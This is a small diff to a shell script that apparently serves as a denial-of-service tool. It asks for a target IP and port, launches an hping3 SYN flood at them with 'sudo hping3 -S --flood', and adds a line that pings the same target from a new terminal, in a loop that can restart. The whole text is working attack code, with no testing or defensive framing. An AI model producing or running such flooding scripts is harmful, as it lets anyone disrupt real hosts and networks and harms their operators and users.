@@ -10,6 +10,7 @@ echo "$(tput setaf 3)
 read -r -p "Input IP target - " IP
 read -r -p "Input port target - " PORT
 sudo hping3 -S --flood -V -p $PORT $IP
+gnome-terminal -- sudo ping $IP
 while true
 do
  read -r -p "Do you want start script again ? (y/n) - " start
